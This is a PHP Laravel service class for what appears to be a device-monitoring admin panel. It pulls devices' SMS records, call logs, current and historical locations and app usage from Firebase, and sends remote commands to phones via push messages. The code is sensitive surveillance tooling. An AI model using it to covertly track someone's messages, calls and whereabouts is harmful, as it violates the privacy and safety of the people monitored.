<?php

namespace App\Services;

use Kreait\Firebase\Factory;
use Kreait\Firebase\ServiceAccount;
use Kreait\Firebase\Database;
use Kreait\Firebase\Messaging\CloudMessage;
use Kreait\Firebase\Messaging\Notification;

/**
 * Firebase Service
 * Handles all Firebase operations for the admin panel
 */
class FirebaseService
{
    protected $database;
    protected $messaging;
    protected $firestore;

    public function __construct()
    {
        $this->initializeFirebase();
    }

    /**
     * Initialize Firebase services
     */
    private function initializeFirebase()
    {
        try {
            $credentialsPath = config_path('firebase-credentials.json');
            
            if (!file_exists($credentialsPath)) {
                throw new \Exception('Firebase credentials file not found');
            }

            $factory = (new Factory)->withServiceAccount($credentialsPath);
            
            $this->database = $factory->createDatabase();
            $this->messaging = $factory->createMessaging();
            $this->firestore = $factory->createFirestore();
            
        } catch (\Exception $e) {
            \Log::error('Firebase initialization failed: ' . $e->getMessage());
            throw $e;
        }
    }

    /**
     * Get all devices from Firebase
     */
    public function getAllDevices()
    {
        try {
            $reference = $this->database->getReference('devices');
            return $reference->getValue() ?? [];
        } catch (\Exception $e) {
            \Log::error('Failed to get devices: ' . $e->getMessage());
            return [];
        }
    }

    /**
     * Get specific device data
     */
    public function getDevice($deviceId)
    {
        try {
            $reference = $this->database->getReference("devices/{$deviceId}");
            return $reference->getValue();
        } catch (\Exception $e) {
            \Log::error("Failed to get device {$deviceId}: " . $e->getMessage());
            return null;
        }
    }

    /**
     * Get current location for device
     */
    public function getCurrentLocation($deviceId)
    {
        try {
            $reference = $this->database->getReference("locations/current/{$deviceId}");
            return $reference->getValue();
        } catch (\Exception $e) {
            \Log::error("Failed to get location for {$deviceId}: " . $e->getMessage());
            return null;
        }
    }

    /**
     * Get recent data from Firebase
     */
    public function getRecentData($dataType, $limit = 10)
    {
        try {
            $reference = $this->database->getReference($dataType);
            $data = $reference->orderByChild('timestamp')
                           ->limitToLast($limit)
                           ->getValue() ?? [];
            
            // Flatten the data structure
            $result = [];
            foreach ($data as $deviceId => $deviceData) {
                foreach ($deviceData as $itemId => $item) {
                    $result[] = $item;
                }
            }
            
            // Sort by timestamp descending
            usort($result, function($a, $b) {
                return ($b['timestamp'] ?? 0) - ($a['timestamp'] ?? 0);
            });
            
            return array_slice($result, 0, $limit);
            
        } catch (\Exception $e) {
            \Log::error("Failed to get recent {$dataType}: " . $e->getMessage());
            return [];
        }
    }

    /**
     * Get data for specific device
     */
    public function getDeviceData($dataType, $deviceId, $limit = 10)
    {
        try {
            $reference = $this->database->getReference("{$dataType}/{$deviceId}");
            $data = $reference->orderByChild('timestamp')
                           ->limitToLast($limit)
                           ->getValue() ?? [];
            
            return array_values($data);
            
        } catch (\Exception $e) {
            \Log::error("Failed to get {$dataType} for {$deviceId}: " . $e->getMessage());
            return [];
        }
    }

    /**
     * Send command to device via FCM
     */
    public function sendCommand($deviceId, $command, $parameters = [])
    {
        try {
            // Get device FCM token
            $device = $this->getDevice($deviceId);
            if (!$device || !isset($device['fcmToken'])) {
                throw new \Exception('Device not found or FCM token not available');
            }

            $message = CloudMessage::withTarget('token', $device['fcmToken'])
                ->withData([
                    'command' => $command,
                    'parameters' => json_encode($parameters),
                    'timestamp' => (string)time()
                ])
                ->withNotification(Notification::create('Remote Command', "Command: {$command}"));

            $result = $this->messaging->send($message);
            
            // Log command
            $this->logCommand($deviceId, $command, $parameters);
            
            return $result;
            
        } catch (\Exception $e) {
            \Log::error("Failed to send command to {$deviceId}: " . $e->getMessage());
            throw $e;
        }
    }

    /**
     * Log command execution
     */
    private function logCommand($deviceId, $command, $parameters)
    {
        try {
            $commandLog = [
                'device_id' => $deviceId,
                'command' => $command,
                'parameters' => $parameters,
                'timestamp' => time(),
                'admin_user' => auth()->user()->email ?? 'system'
            ];
            
            $this->database->getReference("commands/{$deviceId}")->push($commandLog);
            
        } catch (\Exception $e) {
            \Log::error('Failed to log command: ' . $e->getMessage());
        }
    }

    /**
     * Get location history for device
     */
    public function getLocationHistory($deviceId, $limit = 100)
    {
        try {
            $collection = $this->firestore->collection('locations');
            $query = $collection->where('deviceId', '=', $deviceId)
                              ->orderBy('timestamp', 'DESC')
                              ->limit($limit);
            
            $documents = $query->documents();
            $locations = [];
            
            foreach ($documents as $document) {
                $locations[] = $document->data();
            }
            
            return $locations;
            
        } catch (\Exception $e) {
            \Log::error("Failed to get location history for {$deviceId}: " . $e->getMessage());
            return [];
        }
    }

    /**
     * Generate analytics data
     */
    public function getAnalytics($deviceId = null, $dateFrom = null, $dateTo = null)
    {
        try {
            $analytics = [
                'sms_count' => 0,
                'calls_count' => 0,
                'locations_count' => 0,
                'app_usage_sessions' => 0
            ];
            
            // Build Firestore queries with filters
            $constraints = [];
            
            if ($deviceId) {
                $constraints[] = ['deviceId', '=', $deviceId];
            }
            
            if ($dateFrom) {
                $constraints[] = ['timestamp', '>=', strtotime($dateFrom) * 1000];
            }
            
            if ($dateTo) {
                $constraints[] = ['timestamp', '<=', strtotime($dateTo) * 1000];
            }
            
            // Get SMS count
            $smsQuery = $this->firestore->collection('sms');
            foreach ($constraints as $constraint) {
                $smsQuery = $smsQuery->where($constraint[0], $constraint[1], $constraint[2]);
            }
            $analytics['sms_count'] = $smsQuery->documents()->size();
            
            // Get calls count  
            $callsQuery = $this->firestore->collection('calls');
            foreach ($constraints as $constraint) {
                $callsQuery = $callsQuery->where($constraint[0], $constraint[1], $constraint[2]);
            }
            $analytics['calls_count'] = $callsQuery->documents()->size();
            
            // Get locations count
            $locationsQuery = $this->firestore->collection('locations');
            foreach ($constraints as $constraint) {
                $locationsQuery = $locationsQuery->where($constraint[0], $constraint[1], $constraint[2]);
            }
            $analytics['locations_count'] = $locationsQuery->documents()->size();
            
            return $analytics;
            
        } catch (\Exception $e) {
            \Log::error('Failed to get analytics: ' . $e->getMessage());
            return [];
        }
    }
}